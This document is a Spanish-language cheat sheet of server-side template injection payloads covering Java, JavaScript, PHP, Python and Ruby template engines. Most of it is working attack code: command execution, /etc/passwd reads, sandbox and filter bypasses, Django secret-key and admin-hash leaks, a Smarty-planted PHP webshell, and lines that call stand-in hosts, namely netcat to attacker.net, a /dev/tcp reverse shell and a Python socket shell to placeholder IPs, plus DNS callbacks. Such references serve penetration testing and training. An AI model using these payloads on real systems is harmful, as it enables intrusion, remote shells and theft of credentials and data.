
### Metodología

1. **Detectar SSTI**: Probar operaciones matemáticas en diferentes sintaxis (`{{7*7}}`, `${7*7}`)
2. **Identificar motor de plantillas**: Ver cómo responde a diferentes payloads
3. **Explorar objetos disponibles**: Buscar clases, módulos, funciones accesibles
4. **Construir payload RCE**: Usar la sintaxis específica del motor para ejecutar comandos
5. **Extraer datos o comprometer sistema**: Leer archivos, obtener shell

![[SSTI plantilla.png]]


### Detección de SSTI
Probar con estos payloads:
```ruby
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
@(7*7)
${{<%[%'"}}%\. --> la mayoría de los casos generará un error en la SSTI vulnerable
```


***Resultado esperado***

Si ves `49` en la respuesta, hay SSTI.


### Identificar el motor de plantillas

***Cheatsheet*** **para encontrar el tipo de plantilla usada mediante la respuesta de** ***Universal Error-Based Polyglots** --> https://cheatsheet.hackmanit.de/template-injection-table/

```ruby
Ejemplos

{{7*'7'}} = 7777777    --> Jinja2
{{7*'7'}} = 49         --> Twig
${7*7} = 49            --> FreeMarker, Velocity, Mako
<%= 7*7 %> = 49        --> ERB (Ruby)
${{7*7}} = 49          --> Pug
#{7*7} = 49            --> Thymeleaf
*{7*7} = 49            --> Razor
```

## SSTI en ASP.NET Razor

#### Injección básica

```C
@(1+2)
```


#### RCE

```C
@{
  // C# code
}
```


## SSTI - Java


| Nombre Plantilla | Formato del Payload          |
| ---------------- | ---------------------------- |
| Codepen          | `#{}`                        |
| Freemarker       | `${3*3}`, `#{3*3}`, `[=3*3]` |
| Groovy           | `${9*9}`                     |
| Jinjava          | `{{ }}`                      |
| Pebble           | `{{ }}`                      |
| Spring           | `*{7*7}`                     |
| Thymeleaf        | `[[ ]]`                      |
| Velocity         | `#set($X="") $X`             |

### Inyección básica en Java


Podemos usar varias expresiones variables, es decir, si `${...}` podemos probar `#{...}`, `*{...}`, `@{...}` o `~{...}`.

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```


### Java - adquirir variables de entornno

```java
${T(java.lang.System).getenv()}`
```


### Java - adquirir usuarios

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}`
```

---

## Freemarker


### Inyección básica


La plantilla puede ser:

```java
Default: `${3*3}`
Legacy: `#{3*3}`
Alternative: `[=3*3]` since [FreeMarker 2.3.4]
```


### Freemarker - Leer archivos


```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII
```


### Freemarker - Ejecución de comandos


```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

### Freemarker - Sandbox Bypass


Ojo cuidao que sólo funciona en versiones de Freemarker por debajo de la 2.3.30

```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## Codepen


### Codepen - RCE

```java
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```


### Codepen - RCE 2

```java
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

---

## Jinjava


### Jinjava - Basic Injection



```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206`
```


### Jinjava - Command Execution

```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

---

## Pebble


### Pebble - Inyección básica

```java
{{ someString.toUPPERCASE() }}`
```


### Pebble - Ejecución de código


**Versión antigua de Pebble ( < version 3.0.9): **

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la')}}
```


**Versión nueva de Pebble :**

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

---

## Velocity


### Velocity - RCE

```velocity
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```


### Velocity - Ejecución de comandos

```velocity
#set($base64EncodedCommand = 'd2hvYW1p')

#set($contextObjectClass = $knownContextObject.getClass())

#set($Base64Class = $contextObjectClass.forName("java.util.Base64"))
#set($Base64Decoder = $Base64Class.getMethod("getDecoder").invoke(null))
#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))

#set($StringClass = $contextObjectClass.forName("java.lang.String"))
#set($command = $StringClass.getConstructor($contextObjectClass.forName("[B"), $contextObjectClass.forName("java.lang.String")).newInstance($decodedBytes, "UTF-8"))

#set($commandArgs = ["/bin/sh", "-c", $command])

#set($ProcessBuilderClass = $contextObjectClass.forName("java.lang.ProcessBuilder"))
#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName("java.util.List")).newInstance($commandArgs))
#set($processBuilder = $processBuilder.redirectErrorStream(true))
#set($process = $processBuilder.start())
#set($exitCode = $process.waitFor())

#set($inputStream = $process.getInputStream())
#set($ScannerClass = $contextObjectClass.forName("java.util.Scanner"))
#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName("java.io.InputStream")).newInstance($inputStream))
#set($scannerDelimiter = $scanner.useDelimiter("\\A"))

#if($scanner.hasNext())
  #set($output = $scanner.next().trim())
  $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
#end
```

---

## Groovy


### Groovy - Basic injection

```groovy
${9*9}
```


### Groovy - Read File

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```


### Groovy - HTTP Request

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### Groovy - Command Execution

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a Script class)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### Groovy - Sandbox Bypass

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

### Groovy - Sandbox Bypass 2

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

---

## Spring Expression Language


### SpEL - Basic Injection

```java
${7*7}
${'patt'.toString().replace('a', 'x')}
```


### SpEL - Exfiltración de DNS 

```java
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
```

### SpEL - Atributos de sesión

```java
${pageContext.request.getSession().setAttribute("admin",true)}
```


### SpEL - Command Execution usando `java.lang.Runtime` accediendo mediante JavaClass

```java
${T(java.lang.Runtime).getRuntime().exec("TU_COMANDO")}
```


### SpEL - Command Execution usando `java.lang.Runtime` accediendo mediante JavaClass

```java
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
```

### SpEL - Command Execution usando `java.lang.Runtime` accediendo mediante invoke

```java
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
```


### SpEL - Command Execution usando `java.lang.Runtime` accediendo mediante javax.script.ScriptEngineManager

```java
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
```


### SpEL - Command Execution usando `java.lang.ProcessBuilder` accediendo mediante javax.script.ScriptEngineManager

```java
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}
```

---

## SSTI - JavaScript


| Template Name | Payload Format   |
| ------------- | ---------------- |
| DotJS         | `{{= }}`         |
| DustJS        | `{}`             |
| EJS           | `<% %>`          |
| HandlebarsJS  | `{{ }}`          |
| HoganJS       | `{{ }}`          |
| Lodash        | `{{= }}`         |
| MustacheJS    | `{{ }}`          |
| NunjucksJS    | `{{ }}`          |
| PugJS         | `#{}`            |
| TwigJS        | `{{ }}`          |
| UnderscoreJS  | `<% %>`          |
| VelocityJS    | `#=set($X="")$X` |
| VueJS         | `{{ }}`          |


### Handlebars


### Handlebars - Inyección básica


```js
{{this}}
{{self}}
```


### Handlebars - Command Execution


Este payload solo funciona en las siguientes versiones:

- `>= 4.1.0`, `< 4.1.2`
- `>= 4.0.0`, `< 4.0.14`
- `< 3.0.7`

```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Lodash


### Lodash - Inyección básica


**Como te crafteas una**

```js
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string:** La cadena de la plantilla
- **options.interpolate:** Es una expresión regular que especifica que el delimitador HTML `interpolate`. 
- **options.evaluate:** Es una expresión regular que especifica que el delimitador HTML `evaluate`.
- **options.escape:** Es una expresión regular que especifica que el delimitador HTML `escape`.


A efectos de RCE, el delimitador de plantillas viene determinado por el parámetro ***options.evaluate***

```js
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>


{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>
```

### Lodash - Ejecución de comandos


```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

---


## SSTI - PHP


|Template Name|Payload Format|
|---|---|
|Blade (Laravel)|`{{ }}`|
|Latte|`{var $X=""}{$X}`|
|Mustache|`{{ }}`|
|Plates|`<?= ?>`|
|Smarty|`{ }`|
|Twig|`{{ }}`|


### Blade

La cadena de `id` se genera con `{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}`.

```php
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
```

---

### Smarty Ejecución de comandos

```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```

---

### Twig


### Twig - Inyección básica

```php
{{7*7}}
{{7*'7'}} would result in 49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```


### Twig - Formato de plantilla

```php
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```


### Twig - Arbitrary File Reading


```php
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```


### Twig - Ejecución de comandos

```php
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
{{['nslookup oastify.com']|filter('system')}}
```


**Ejemplo de inyección de valores para evitar el uso de comillas en el nombre del archivo (especifique mediante** ***OFFSET*** y ***LENGTH*** **dónde se encuentra el nombre del archivo de carga útil).**

```php
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
```


**Ejemplo con un correo electrónico que pasa** ***FILTER_VALIDATE_EMAIL PHP***.

```php
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@atacante.tld
```

---

## Latte


### Latte - Inyección básica

```php
{var $X="POC"}{$X}
```


### Latte - Ejecución de comandos

```php
{php system('nslookup oastify.com')}
```

---

## patTemplate


```xml
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="foo">
    It contains another template.
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

---

## PHPlib and HTML_Template_PHPLIB


[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) es lo mismo que ***PHPLIB*** pero porteado en ***Pear*** 

Estructura `authors.tpl`

```html
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>Authors</caption>
   <thead>
    <tr><th>Name</th><th>Email</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- INICIO authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- FIN authorline -->
   </tbody>
  </table>
 </body>
</html>
```

Estructura `authors.php`

```php
<?php
//se quiere mostrar esta lista de autores
$authors = array(
    'Christian Weiske'  => 'cweiske@php.net',
    'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//crea un objeto de plantilla
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//carga fichero
$t->setFile('authors', 'authors.tpl');
//configura un block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//configura valores
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//muestra los autores
foreach ($authors as $name => $email) {
    $t->setVar('AUTHOR_NAME', $name);
    $t->setVar('AUTHOR_EMAIL', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

//fin y echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```

---

## Plates


Controlador:

```php
// Crear una nueva instancia Plates 
$templates = new League\Plates\Engine('/path/to/templates');

// Renderiza la plantilla
echo $templates->render('profile', ['name' => 'Jonathan']);
```

Página de la plantilla:

```html
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```

Diseño de plantilla:

```html
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```

___

## SSTI - Python


| Nombre plantilla | Formato de payload |
| ---------------- | ------------------ |
| Bottle           | `{{ }}`            |
| Chameleon        | `${ }`             |
| Cheetah          | `${ }`             |
| Django           | `{{ }}`            |
| Jinja2           | `{{ }}`            |
| Mako             | `${ }`             |
| Pystache         | `{{ }}`            |
| Tornado          | `{{ }}`            |

## Django


### Django - Inyección básica

```python
{% csrf_token %} # da error con Jinja2
{{ 7*7 }}  # da error con plantillas Django
ih0vr{{364|add:733}}d121r # Payload Burp -> ih0vr1097d121r
```


### Django - CSS

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```


### Django - Debug Information Leak

```python
{% debug %}
```


### Django - Leaking App's Secret Key

```python
{{ messages.storages.0.signer.key }}
```


### Django - Admin Site URL leak

```python
{% include 'admin/base.html' %}
```


### Django - Leak de usuario Admin y hash de contraseña

```python
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}

{% get_admin_log 10 as admin_log for_user user %}
```

---

## Jinja2


### Jinja2 - Inyección básica

```python
{{4*4}}[[5*5]]
{{7*'7'}} #debería dar --> 7777777
{{config.items()}}
```


### Jinja2 - Formato de plantilla


```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}
```


### Jinja2 - Debug Statement

**Si la extensión de** *debug* **está activado el** *tag* **de** ***{% debug %}*** **debería de estar disponible para poder** ***dumpear***

```python
<pre>{% debug %}</pre>
```


### Jinja2 - Dumpear todas las clases usadas

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

Acceso `__globals__` and `__builtins__`:

```python
{{ self.__init__.__globals__.__builtins__ }}
```


### Jinja2 - Dumpear todas las variables configuradas

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```


### Jinja2 - Read Remote File


```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```


### Jinja2 - Escribir en un archivo remoto

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```


### Jinja2 - Forzar el la salida en un Blind RCE

**Puedes importar funciones de** ***Flask*** **para devolver una salida de la página vulnerable**

```python
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```


### Exploit de SSTI haciendo una llamada a os.popen().read()

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Pero cuando se filtra `__builtins__`, las siguientes cargas útiles son independientes del contexto y no requieren nada, excepto estar en un objeto de plantilla de Jinja2 :

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

Se pueden usar estas payloads más cortas

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

Con [objectwalker](https://github.com/p0dalirius/objectwalker) podemos encontrar una ruta al módulo `os` desde `lipsum`. Esta es la carga útil más corta conocida para lograr RCE en una plantilla Jinja2:

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```


### Exploit de SSTI haciendo una llamada a subprocess.Popen

El número 396 variará en función de la aplicación.

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```


### Exploit de SSTI haciendo una llamada a Popen Sin adivinar el desplazamiento

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

Modificación sencilla de la carga útil para limpiar la salida y facilitar la entrada de comandos, en otro parámetro GET, incluye una variable llamada «input» que contenga el comando que deseas ejecutar (por ejemplo: &input=ls)

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```


### Exploit de SSTI escribiendo un Evil Config File

```python
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```


### Jinja2 - Bypass de filtros

```python
request.__class__
request["__class__"]
```

Bypassear `_`

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

Bypassear `[` and `]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

Bypassear `|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

Bypassear los filtros más comunes ('.','_','|join','[',']','mro' and 'base')

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

---

## Tornado


### Tornado - Inyección básica

```python
{{7*7}}
{{7*'7'}}
```

### Tornado - RCE

```python
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

---

## Mako


### Mako - Inyección básica

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Mako - RCE

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

PoC :

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```


___

## SSTI - Ruby


| Nombre plantilla | Formato de payload |
| ---------------- | ------------------ |
| Erb              | `<%= %>`           |
| Erubi            | `<%= %>`           |
| Erubis           | `<%= %>`           |
| HAML             | `#{ }`             |
| Liquid           | `{{ }}`            |
| Mustache         | `{{ }}`            |
| Slim             | `#{ }`             |

### Ruby - Inyección básica


### ERB

```ruby
<%= 7 * 7 %>
```

### Slim

```ruby
#{ 7 * 7 }
```


### Ruby - adquirir /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```


### Ruby - Listar ficheros y directorios

```ruby
<%= Dir.entries('/') %>
```


### Ruby - RCE

**Erb**,**Erubi**,**Erubis**

```ruby
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

**Slim**

```ruby
#{ %x|env| }
```
